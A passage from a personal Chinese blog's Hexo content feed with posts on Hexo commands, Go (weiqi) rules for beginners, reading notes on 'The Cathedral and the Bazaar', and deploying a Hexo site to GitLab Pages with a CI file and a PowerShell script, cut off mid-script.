<h3 id="二-Hexo指令"><a href="#二-Hexo指令" class="headerlink" title="二 Hexo指令"></a>二 Hexo指令</h3><h4 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h4><p>输入hexo -h可以看到hexo的可用指令。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241212195924850.png" alt="image-20241212195924850" style="zoom:50%;" />

<p>这里介绍几个常用的：</p>
<p><strong>hexo clean</strong>     清除生成的缓存和静态文件<br><strong>hexo generate &#x3D;&#x3D; hexo g</strong>  生成静态网站文件（&#x2F;public）<br><strong>hexo server &#x3D;&#x3D; hexo s</strong>   启动一个本地测试服务器，用于在浏览器中预览生成的静态网站。<br><strong>hexo deploy &#x3D;&#x3D; hexo d</strong>  将生成的静态网站文件部署到指定的服务器或托管平台</p>
<h4 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h4><p>以后我们每次更新博客、配置或代码后，如果本地预览博客，执行以下三个命令即可：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo <span class="selector-tag">g</span></span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>如果要发布到线上，则：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo <span class="selector-tag">g</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<h3 id="三-上传博客"><a href="#三-上传博客" class="headerlink" title="三 上传博客"></a>三 上传博客</h3><p>如果想写博客，只需要将md文件放入blog&#x2F;source&#x2F;_posts文件夹下即可，同时md文件的开头需要写上例如：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">我的第一份博客</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2024-12-12 19:44:00</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">一份标签</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">一种类别</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<p>接下来执行三个hexo命令，网页里就会出现这篇博客了。</p>
<h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>接下来会讲如何发布借助Gitlab Pages将网站发布到线上。</p>
]]></content>
      <categories>
        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>个人网页</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>围棋基本规则及入门</title>
    <url>/2024/12/14/%E5%9B%B4%E6%A3%8B%E5%9F%BA%E6%9C%AC%E8%A7%84%E5%88%99%E5%8F%8A%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="围棋规则及入门"><a href="#围棋规则及入门" class="headerlink" title="围棋规则及入门"></a>围棋规则及入门</h1><p>注：本篇是用组会报告时的ppt转来的，因此更像是一份ppt而不是博客。</p>
<hr>
<h2 id="围棋规则介绍"><a href="#围棋规则介绍" class="headerlink" title="围棋规则介绍"></a>围棋规则介绍</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_0.png" 
         style="width: 300px;margin-left: 20px; margin-right: 20px; border: 1px solid #ccc;">
    <div>
     <p><strong>围棋棋盘：</strong>围棋使用 19 × 19 路棋盘，棋子落在横竖线交叉点上。</p>
     <p><strong>星位：</strong>九个标志点，便于定位棋子的布局。</p>
     <p><strong>天元：</strong>棋盘中央的圆点。</p>
    </div>
</div>

<hr>
<h2 id="黑白交替落子"><a href="#黑白交替落子" class="headerlink" title="黑白交替落子"></a>黑白交替落子</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_1.png" 
         style="width: 300px;margin-left: 20px; margin-right: 20px; border: 1px solid #ccc!;">
    <div>
    	<p>围棋由黑白双方对弈，遵循以下规则：</p>
        <p><strong>黑方先手：</strong>黑棋在每盘棋中率先落子。</p>
        <p><strong>交替落子：</strong>双方轮流下子，直至棋局结束。</p>
    </div>
</div>

<span id="more"></span>

<hr>
<h2 id="气"><a href="#气" class="headerlink" title="气"></a>气</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_2.png" 
         style="width: 300px;margin-left: 20px; margin-right: 20px; border: 1px solid #ccc;">
    <div>
    	<p><strong>什么是“气”？</strong></p>
        <ul>
            <li>“气”是指棋子周围紧邻的空点。</li>
            <li>多个同色棋子相连时，共享这些空点作为“气”。</li>
            <li>棋盘边界或对手棋子会减少气。</li>
    </div>
</div>


<hr>
<h2 id="提子"><a href="#提子" class="headerlink" title="提子"></a>提子</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_3.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p><strong>提子：</strong>当一个棋子或一组棋子失去所有“气”时，这些棋子会被对方吃掉，称为“提子”。</p>
    </div>
</div>

<div>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_4.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
</div>



<hr>
<h2 id="禁着点"><a href="#禁着点" class="headerlink" title="禁着点"></a>禁着点</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_5.png" 
         style="width: 200px;margin-left: 20px; margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p><strong>禁着点：</strong>当一个棋子在落子后无法获得“气”，则该位置称为禁着点，不能落子。</p>
    </div>
</div>
<div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_6.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p><strong>禁着点的反例：</strong></p>
        <p>如果落子后无气，但能够吃掉对方棋子，则该位置仍然可以落子。</p>
    </div>
</div>

<div>
     <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_7.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
</div>



<hr>
<h2 id="眼"><a href="#眼" class="headerlink" title="眼"></a>眼</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_8.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p><strong>什么是“眼”？</strong></p>
        <ul>
            <li>如果对方无法落子的位置，称为“眼”。</li>
            <li>对于对方来说，眼是一个禁着点。</li>
        </ul>
    </div>
</div>


<hr>
<h2 id="活棋"><a href="#活棋" class="headerlink" title="活棋"></a>活棋</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_9.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
 		<p><strong>活棋：</strong>拥有两个真眼的棋组称为“活棋”。</p>
        <ul>
            <li>活棋无法被对方提子。</li>
            <li>它们可以稳定地占有地盘。</li>
        </ul>
    </div>
</div>



<hr>
<h2 id="死棋与假眼"><a href="#死棋与假眼" class="headerlink" title="死棋与假眼"></a>死棋与假眼</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_10.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
 <p><strong>死棋：</strong>是指没有眼位并且无法活的棋子，它们会在对方的攻击下被提掉。</p>
        <p><strong>假眼：</strong>是指看似能帮助棋子活的点，但实际上由于对方可以在其周围形成提子，假眼无法真正提供“气”来救活棋子。</p>
    </div>
</div>


<hr>
<h2 id="打劫"><a href="#打劫" class="headerlink" title="打劫"></a>打劫</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_11.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p><strong>打劫：</strong>为避免双方无限循环提子，规定一方提子后，另一方必须在其他地方落子后才能重新提回。</p>
    </div>
</div>

<div>
      <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_12.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
</div>



<hr>
<h2 id="计算胜负"><a href="#计算胜负" class="headerlink" title="计算胜负"></a>计算胜负</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_13.png" 
         style="width: 300px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p><strong>计算胜负：</strong>围棋的胜负通过比较双方围成的地盘大小来决定，地盘大的玩家获胜。</p>
        <p>具体计算胜负时，黑方有先手优势，因此需要加上<strong>贴目</strong>：</p>
        <ul>
            <li><strong>中国规则：</strong>胜负按“子”计算。</li>
            <li>黑贴 3 又 3/4 子</li>
            <li>因此，黑棋占 185 子胜，184 子则负。</li>
        </ul>
    </div>
</div>

<h4>为什么是“3 又 3/4 子”？</h4>
<div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_15.png" 
         style="width: 300px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <ul>
            <li>这是为了防止出现平局的情况。</li>
            <li><strong>“双活”</strong>：双方都无法杀死对方，因此共同存活。如果双方都在中间共享一颗子，便会瓜分这颗子。</li>
        </ul>
    </div>
</div>



<hr>
<h2 id="入门知识-——-布局"><a href="#入门知识-——-布局" class="headerlink" title="入门知识 —— 布局"></a>入门知识 —— 布局</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_17.png" 
         style="width: 300px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p><strong>布局：</strong>棋局开始时，双方抢占棋盘的边角和全局的关键位置，确立战略方向。布局阶段注重效率和速度。</p>
    </div>
</div>

<div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_18.png" 
         style="width: 300px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p><strong>口诀：</strong>金角银边草肚皮<p>
        <p>围角的效率要高于围边，围边的效率高于围中央</p>
    </div>
</div>

<div style="display: flex; align-items: flex-start;">
        <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_19.png" 
         style="width: 300px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
</div>




<hr>
<h2 id="布局-——-定式"><a href="#布局-——-定式" class="headerlink" title="布局 —— 定式"></a>布局 —— 定式</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_20.png" 
         style="width: 250px;margin-left: 20px; margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p><strong>定式：</strong>定式是指在特定局部（例如角部）经过长期实践和研究，形成的常用下法。</p>
        <p>通过定式，双方的局面可以大致安定，利益大小基本均衡。</p>
    </div>
</div>


<hr>
<h2 id="布局-——-实地与厚势"><a href="#布局-——-实地与厚势" class="headerlink" title="布局 —— 实地与厚势"></a>布局 —— 实地与厚势</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_21.png" 
         style="width: 250px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p>在布局阶段，常常有取地还是取势之分。</p>
        <p><strong>实地：</strong>是指明确围成的地盘区域。</p>
        <p><strong>厚势：</strong>指的是对局部或全局有强大影响力的棋形。</p>
    </div>
</div>



<hr>
<h2 id="死活"><a href="#死活" class="headerlink" title="死活"></a>死活</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_22.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
 		<p>死活指：一方努力做出两个眼以做活 / 或者另一方破坏对方眼位以杀棋</p>
        <p><strong>考验：</strong>计算力</p>
    </div>
</div>

<div>
     <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_23.png" 
         style="width: 200px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
</div>




<hr>
<h2 id="中盘"><a href="#中盘" class="headerlink" title="中盘"></a>中盘</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_24.png" 
         style="width: 300px;margin-left: 20px; margin-right: 20px; border: 1px solid #ccc;">
    <div>
           <p><strong>中盘：</strong>布局完成后，双方进行攻防，争夺主动权，并扩大战果。</p>
           <p><strong>考验：</strong>计算力和判断力在此阶段尤为重要。</p>
    </div>
</div>


<hr>
<h2 id="收官"><a href="#收官" class="headerlink" title="收官"></a>收官</h2><div style="display: flex; align-items: flex-start;">
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/组会汇报_围棋_靳琦清_522024320076_25.png" 
         style="width: 300px; margin-left: 20px;margin-right: 20px; border: 1px solid #ccc;">
    <div>
        <p><strong>收官：</strong>在棋局的最后阶段，双方开始收尾抢占空白点，并修补之前的漏洞。胜负通常取决于这时的精确计算。</p>
    </div>
</div>


<hr>
<h2 id="一些实战经验"><a href="#一些实战经验" class="headerlink" title="一些实战经验"></a>一些实战经验</h2><p>围棋的学习不仅仅是了解规则，还需要不断的实践与总结。以下是一些有助于提高围棋水平的经验：</p>

<ol>
    <li><strong>学习定式与手筋：</strong>掌握常见的定式和手筋，理解其背后的战略思想。定式不仅帮助你在局部获得稳定的形势，还能提高你的计算能力。</li>
    <li><strong>多做死活题：</strong>死活题是围棋中非常重要的部分，解决死活题能有效培养你的计算力和判断力。</li>
    <li><strong>多看围棋教程：</strong>通过书籍和视频教程深入理解围棋的各类战术和战略，切忌闭门造车。</li>
    <li><strong>多实战：</strong>无论是与人对弈，还是参加棋盘模拟，都能帮助你在实践中提升。同时记住，<strong>胜败乃兵家常事</strong>。</li>
</ol>


<h3>推荐资源</h3>
<p>以下是一些优秀的围棋学习资源，帮助你更好地入门和提高：</p>
<ul>
    <li><a href="https://www.bilibili.com/video/BV1tt4y1G7KR/?share_source=copy_web&vd_source=acbcb2f114f7508436343c73d901bc1e" target="_blank">邱百瑞带你零基础学围棋【全集】</a>（适合初学者，循序渐进地讲解围棋基础）</li>
    <li><a href="https://www.bilibili.com/video/BV1uW411W7xK/?share_source=copy_web&vd_source=acbcb2f114f7508436343c73d901bc1e" target="_blank">20天从零学会下围棋</a>（一个快速入门的围棋教程，帮助你在短时间内掌握基础）</li>
</ul>

<hr>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>你已经掌握了围棋的基本规则，接下来就是通过不断实战来积累经验！</p>
<p>相信你已经准备好了，去挑战柯洁和阿法狗吧！</p>

<blockquote>
<p>来自2024lf组会</p>
</blockquote>
]]></content>
      <categories>
        <category>围棋</category>
      </categories>
      <tags>
        <tag>围棋</tag>
      </tags>
  </entry>
  <entry>
    <title>《大教堂与集市》读书笔记</title>
    <url>/2025/02/21/%E5%A4%A7%E6%95%99%E5%A0%82%E4%B8%8E%E9%9B%86%E5%B8%82%E8%AF%BB%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<h3 id="一、书名和作者"><a href="#一、书名和作者" class="headerlink" title="一、书名和作者"></a>一、书名和作者</h3><ul>
<li><strong>书名</strong>：《大教堂与集市》（<em>The Cathedral and the Bazaar</em>）</li>
<li><strong>作者</strong>：埃里克·雷蒙德（Eric S. Raymond）</li>
</ul>
<h3 id="二、书籍概览"><a href="#二、书籍概览" class="headerlink" title="二、书籍概览"></a>二、书籍概览</h3><p>​	《大教堂与集市》主要讨论了软件开发模式的转变，比较了传统的封闭式开发（大教堂模式）与开放式开发（集市模式）。雷蒙德通过对Linux内核开发的观察，提出了开放源代码模式的优势，强调了协作和社区的重要性。书中结构清晰，从作者的个人经验到更广泛的行业影响，层层展开。</p>
<p>​	本书的目标读者主要是软件开发人员、项目管理者以及对开源文化感兴趣的技术人士。它为希望了解开源开发理念及其在软件工程中的应用场景的读者提供了深刻的洞见。</p>
<span id="more"></span>

<h3 id="三、核心观点与主题总结"><a href="#三、核心观点与主题总结" class="headerlink" title="三、核心观点与主题总结"></a>三、核心观点与主题总结</h3><p>​	《大教堂与集市》最核心的观点是，传统的软件开发（大教堂模式）以封闭为基础，由少数精英开发者主导，软件发布周期较长，且每个版本的发布都经过严格的规划和精心的设计。而与此相对的集市模式则是一种开放的、协作式的开发方式，通过大量开发者的参与、不断的迭代和快速反馈，能够实现更高效的开发成果。</p>
<p>​	大教堂模式代表了早期软件工程中的主流实践，这种模式下，开发者犹如建筑师精心设计和建造大教堂，每一个细节都由内部核心团队掌控，外界几乎没有机会参与。而集市模式则打破了这种封闭性，开发过程变得更加开放，任何人都可以参与，提出改进意见甚至直接贡献代码。集市模式的成功源于大量开发者的贡献，他们提供了多样化的视角和快速修复问题的能力。</p>
<p>​	雷蒙德以Linux项目为例，说明了开源模式的潜力。他观察到，当众多开发者共同参与时，问题的发现和修复会加速。通过共享源代码，开发者能够更迅速地识别软件中的错误。这种模式之所以有效，是因为开发的透明性使得问题暴露更早，解决方案也可以来自不同的参与者，具有高度灵活性。</p>
<p>​	在这个过程中，集市模式不仅帮助项目快速成长，还为软件引入了更多的创新元素。来自不同背景的开发者根据自身需求和经验贡献代码，项目因此涵盖了更多实际应用场景，开发也变得更加多样化和富有创造力。</p>
<p>​	更重要的是，集市模式打破了传统开发的单一结构，它赋予了开发者更多的自由，软件在需求变化时也可以快速调整。雷蒙德指出，面对不断变化的技术环境，开放式协作可以更好地适应这种动态性，确保项目能够不断演进并保持生命力。</p>
<p>​	这种模式让软件开发更具弹性，也更能充分利用集体智慧。开源社区的力量通过集市模式得以展现，软件开发不再是少数人的专属任务，而成为了全球开发者共同的事业。</p>
<h3 id="四、批评与局限性"><a href="#四、批评与局限性" class="headerlink" title="四、批评与局限性"></a>四、批评与局限性</h3><p>​	尽管集市模式带来了许多好处，但在实际操作中仍然存在挑战。不是所有开源项目都能像Linux一样，吸引到大量开发者的参与。对于一些复杂度较高或知名度较低的项目，即使开放源代码，也未必能够获得广泛的支持。这样一来，项目的进展可能会变得缓慢，集市模式的优势难以充分发挥。</p>
<p>​	同时，管理开放项目时，开发者必须面对大量不同背景、不同水平的贡献者。如何确保项目方向一致、质量稳定，是一个需要长期关注的问题。尤其在开源项目中，许多代码的质量可能参差不齐，过多的贡献者反而可能带来整合难度，使得项目管理者承受更大压力。</p>
<p>​	集市模式在某些特定场景下的适用性也需要仔细考量。比如，对于那些涉及高安全性、隐私保护或严格法律要求的项目，完全开放的开发流程可能不够安全。这类项目往往要求更高的控制和审查机制，而集市模式难以满足这些要求。</p>
<p>​	此外，开放性带来的多样化虽然是优点，但也可能引发项目的分裂。开发者可能因为不同的需求而对软件进行各自的修改，这些修改如果不能很好地协调和整合，可能导致项目分支混乱，维护难度加大。</p>
<h3 id="五、自己的感悟和思考"><a href="#五、自己的感悟和思考" class="headerlink" title="五、自己的感悟和思考"></a>五、自己的感悟和思考</h3><p>​	阅读《大教堂与集市》让我对开源模式有了更加全面的理解。作为一名软件工程专业的学生，我一直对开源软件抱有浓厚的兴趣，但此前更多是从技术层面去看待开源。而本书让我意识到，开源不仅仅是技术的选择，更是一种管理和组织模式的选择。</p>
<p>​	在大教堂模式和集市模式的比较中，我深刻感受到，软件开发不仅仅是工程问题，更是社会协作的问题。尤其是在当前全球化的技术环境下，开源项目的成功往往依赖于全球开发者的集体智慧，这种“集市”的力量令人惊叹。但我也逐渐认识到，开放协作的模式并非万能的，对于一些复杂、要求高度一致性和可靠性的项目，传统的大教堂模式依然有其不可替代的优势。</p>
<p>​	此外，集市模式让我反思个人在项目中的角色和定位。在一个集市式的开发环境中，每个开发者的贡献都是项目的一部分，如何平衡个体的自由与项目的整体目标，如何在开放的环境中高效合作，这都是未来我在工作和研究中需要认真思考的问题。</p>
<p>​	总之，《大教堂与集市》不仅提供了开源开发的理论基础，更让我从中看到了软件开发的未来趋势，以及个人在其中的责任与机会。</p>
<h3 id="六、总结与评价"><a href="#六、总结与评价" class="headerlink" title="六、总结与评价"></a>六、总结与评价</h3><p>​	《大教堂与集市》是一部具有划时代意义的著作，通过对大教堂模式与集市模式的比较，深刻揭示了软件开发中的管理哲学转变。书中对开源理念的探讨为当代软件开发提供了重要的理论支撑，同时也为未来的开发模式指明了方向。无论是对开源项目的管理者，还是普通开发者，书中的观点都值得深入思考。作为一本既有理论深度又有实践指导意义的作品，它无疑是每一位软件工程师的必读书目。</p>
]]></content>
      <categories>
        <category>软件工程管理</category>
      </categories>
      <tags>
        <tag>软件工程管理</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（七）—— Gitlab Pages部署（二）</title>
    <url>/2024/12/14/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94Gitlab%20Pages%E9%83%A8%E7%BD%B2%E4%BA%8C/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>在第二章中，我们讲了如何将 Hexo 生成的网页部署到 GitLab Pages，但有一个比较麻烦的地方：每次改写网页或新增 Markdown 文件后，运行 <code>hexo deploy</code> 部署时，都需要重新在 GitLab 项目中上传 <code>.gitlab-ci.yml</code> 文件以触发流水线。这无疑非常麻烦。</p>
<p>经过两小时的研究，我发现问题的根源在于：通过 <code>hexo deploy</code> 部署网站实际上是 GitHub Pages 的惯用方式，而 Hexo 官方文档中对于 GitLab Pages 的部署建议则是另一种方法。</p>
<p>本章将讨论部署到 GitHub Pages 和 GitLab Pages 的区别，以及当我们错误地使用 GitHub Pages 的方式部署到 GitLab Pages 时（是的，这种“粗心”就是我了），有没有快捷的补救办法来避免每次上传 <code>.gitlab-ci.yml</code> 文件。</p>
<blockquote>
<p><strong>说明</strong>：这里所说的部署是指改写网页或新增 Markdown 文件后，重新部署更新网站，而非从零开始的部署流程。</p>
</blockquote>
<span id="more"></span>

<h3 id="部署到-GitHub-Pages-的流程"><a href="#部署到-GitHub-Pages-的流程" class="headerlink" title="部署到 GitHub Pages 的流程"></a>部署到 GitHub Pages 的流程</h3><p>第二章中所讲的办法，其实是标准的 GitHub Pages 部署流程。操作步骤如下：</p>
<ol>
<li><p>在博客目录中进行修改，比如更改配置或新增 Markdown 文件；</p>
</li>
<li><p>依次运行熟悉的 Hexo 命令三件套：</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">hexo clean  # 这一步是，清空public/目录</span><br><span class="line">hexo <span class="keyword">generate</span>  # 这一步是，在public/目录中生成静态网页</span><br><span class="line">hexo deploy  # 这一步是，将public/目录推送到远程仓库</span><br></pre></td></tr></table></figure></li>
</ol>
<p>完成以上操作后，如果目标是 GitHub Pages，网站即可自动更新。</p>
<p>但对于 GitLab Pages，我们还缺少 <code>.gitlab-ci.yml</code> 文件来触发流水线，因此每次都需手动上传该文件，这显然不是 Hexo 官方推荐的 GitLab Pages 部署方式。</p>
<h3 id="部署到Gitlab-Pages流程"><a href="#部署到Gitlab-Pages流程" class="headerlink" title="部署到Gitlab Pages流程"></a>部署到Gitlab Pages流程</h3><p><a href="https://hexo.io/zh-cn/docs/gitlab-pages">将 Hexo 部署到 GitLab Pages | Hexo</a></p>
<p><a href="https://blog.csdn.net/qq_34383510/article/details/129214500">2023年最新详细教程！手把手教你搭建Hexo + GitLab个人博客_如何搭建 hexo gitlab-CSDN博客</a></p>
<p>查看 Hexo 官方文档后，我了解到正确的 GitLab Pages 部署方法应如下：</p>
<ol>
<li><p>在 GitHub 仓库中，通常只存储静态网页代码（即 <code>public/</code> 目录的内容）；而在 GitLab 仓库中，需存储完整的源代码（即 <code>blog/</code> 目录的内容）。此时，GitLab 项目的目录结构应类似于：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">├── _config.yml</span><br><span class="line">├── <span class="keyword">package</span>.json</span><br><span class="line">├── <span class="keyword">source</span>/</span><br><span class="line">├── themes/</span><br><span class="line">└── .gitignore</span><br></pre></td></tr></table></figure>
</li>
<li><p>在 <code>.gitignore</code> 文件中，确保包含以下行：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>/</span><br></pre></td></tr></table></figure>
</li>
<li><p>启用 GitLab 的共享运行器：<br>依次进入 <strong>Settings</strong> &gt; <strong>CI&#x2F;CD</strong> &gt; <strong>Runners</strong> &gt; <strong>Enable shared runners for this project</strong>。</p>
</li>
<li><p>在项目根目录（即 <code>blog/</code>）中添加 <code>.gitlab-ci.yml</code> 文件（只需添加一次），内容如下（将 <code>node:16</code> 中的 <code>16</code> 替换为你的 Node 主版本号）：</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">image</span><span class="punctuation">:</span> <span class="string">node:16-alpine</span></span><br><span class="line"><span class="attribute">cache</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">paths</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">node_modules/</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">before_script</span><span class="punctuation">:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm install hexo-cli -g</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm install</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">pages</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">script</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">npm run build</span></span><br><span class="line">  <span class="attribute">artifacts</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">paths</span><span class="punctuation">:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">public</span></span><br><span class="line">  <span class="attribute">rules</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>提交代码并推送：</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">add</span> .</span><br><span class="line">git commit -m <span class="string">&quot;Add CI/CD pipeline&quot;</span></span><br><span class="line">git <span class="keyword">push</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>GitLab 的 CI&#x2F;CD 管道会自动运行，部署成功后即可访问网站。此后，只需更新 Markdown 文件或配置并将更改推送到仓库，流水线会自动运行，无需再手动上传 <code>.gitlab-ci.yml</code> 文件。</p>
<h3 id="如何补救——一个取巧办法"><a href="#如何补救——一个取巧办法" class="headerlink" title="如何补救——一个取巧办法"></a>如何补救——一个取巧办法</h3><p>由于看了一份错误的教程，导致我用了部署到Github Pages的流程（即hexo命令三件套）来部署到了Gitlab Pages，因此我想有没有一个补救办法，在还是用hexo命令三件套的前提下，不用每次跑到gitlab项目中重新上传.gitlab-ci.yml文件？<br>很简单，在运行 <code>hexo clean</code> 和 <code>hexo generate</code> 后，将 <code>.gitlab-ci.yml</code> 文件复制到 <code>public/</code> 目录，再运行 <code>hexo deploy</code>，即可触发流水线。这种方式虽然“取巧”，但有效解决了问题。</p>
<p>为了方便，我写了一个powershell脚本 deploy.ps1 来执行这个过程：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Clean Hexo files</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Cleaning Hexo...&quot;</span> <span class="literal">-ForegroundColor</span> Green</span><br><span class="line">hexo clean</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$LASTEXITCODE</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">Write-Error</span> <span class="string">&quot;hexo clean failed&quot;</span></span><br><span class="line">    <span class="keyword">exit</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Generate static files</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span 